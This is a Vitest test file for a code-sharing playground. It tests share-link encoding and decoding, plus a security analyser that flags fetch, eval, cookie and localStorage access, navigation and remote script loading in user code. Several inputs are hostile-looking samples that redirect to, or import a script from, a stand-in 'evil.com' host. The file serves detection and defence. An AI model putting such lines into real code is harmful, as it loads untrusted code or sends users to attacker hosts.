import { describe, it, expect } from 'vitest';
import { encodeShareCode, decodeShareCode } from '../share';
import { analyzeCode } from '../../engines/js/security';

describe('encodeShareCode / decodeShareCode', () => {
  it('round-trips code correctly', () => {
    const code = 'let x = 1;\nconsole.log(x);';
    const encoded = encodeShareCode(code);
    const decoded = decodeShareCode(encoded);
    expect(decoded).toBe(code);
  });

  it('trims whitespace before encoding', () => {
    const code = '  let x = 1;  \n';
    const encoded = encodeShareCode(code);
    const decoded = decodeShareCode(encoded);
    expect(decoded).toBe(code.trim());
  });

  it('encoded string starts with version prefix', () => {
    const encoded = encodeShareCode('let x = 1;');
    expect(encoded).toMatch(/^v1~/);
  });

  it('decodes legacy (no version prefix) links', async () => {
    // Simulate a legacy link by encoding without the version prefix
    const { compressToEncodedURIComponent } = await import('lz-string');
    const legacy = compressToEncodedURIComponent('let x = 1;');
    const decoded = decodeShareCode(legacy);
    expect(decoded).toBe('let x = 1;');
  });

  it('returns null for unknown version', () => {
    const decoded = decodeShareCode('v999~garbage');
    expect(decoded).toBeNull();
  });

  it('handles garbled input gracefully', () => {
    const decoded = decodeShareCode('v1~!!!invalid!!!');
    // lz-string may return null, empty string, or garbage for invalid data.
    // The key assertion: it does not throw.
    expect(typeof decoded === 'string' || decoded === null).toBe(true);
  });

  it('handles empty string encoding', () => {
    const encoded = encodeShareCode('');
    const decoded = decodeShareCode(encoded);
    expect(decoded).toBe('');
  });

  it('handles code with special characters', () => {
    const code = 'let x = "hello & world <script>";';
    const encoded = encodeShareCode(code);
    const decoded = decodeShareCode(encoded);
    expect(decoded).toBe(code);
  });
});

describe('analyzeCode', () => {
  it('returns empty array for clean code', () => {
    const flags = analyzeCode('let x = 1;\nconsole.log(x);');
    expect(flags).toEqual([]);
  });

  it('flags fetch calls', () => {
    const flags = analyzeCode('fetch("https://example.com")');
    expect(flags.length).toBe(1);
    expect(flags[0].level).toBe('warning');
    expect(flags[0].message).toContain('fetch');
  });

  it('flags eval usage', () => {
    const flags = analyzeCode('eval("alert(1)")');
    expect(flags.length).toBe(1);
    expect(flags[0].message).toContain('eval');
  });

  it('flags XMLHttpRequest', () => {
    const flags = analyzeCode('new XMLHttpRequest()');
    expect(flags.length).toBe(1);
    expect(flags[0].message).toContain('XMLHttpRequest');
  });

  it('flags WebSocket', () => {
    const flags = analyzeCode('new WebSocket("ws://localhost")');
    expect(flags.length).toBe(1);
    expect(flags[0].message).toContain('WebSocket');
  });

  it('flags document.cookie access', () => {
    const flags = analyzeCode('let c = document.cookie;');
    expect(flags.length).toBe(1);
    expect(flags[0].message).toContain('cookie');
  });

  it('flags localStorage', () => {
    const flags = analyzeCode('localStorage.setItem("key", "val")');
    expect(flags.length).toBe(1);
    expect(flags[0].message).toContain('localStorage');
  });

  it('flags new Function constructor', () => {
    const flags = analyzeCode('new Function("return 1")');
    expect(flags.length).toBe(1);
    expect(flags[0].message).toContain('Function constructor');
  });

  it('flags location navigation', () => {
    const flags = analyzeCode('location.href = "http://evil.com"');
    expect(flags.length).toBe(1);
    expect(flags[0].message).toContain('navigate');
  });

  it('flags window.open', () => {
    const flags = analyzeCode('window.open("http://example.com")');
    expect(flags.length).toBe(1);
    expect(flags[0].message).toContain('window');
  });

  it('flags importScripts', () => {
    const flags = analyzeCode('importScripts("http://evil.com/script.js")');
    expect(flags.length).toBe(1);
    expect(flags[0].message).toContain('import');
  });

  it('detects multiple suspicious patterns', () => {
    const flags = analyzeCode('fetch("url"); eval("code");');
    expect(flags.length).toBe(2);
  });
});
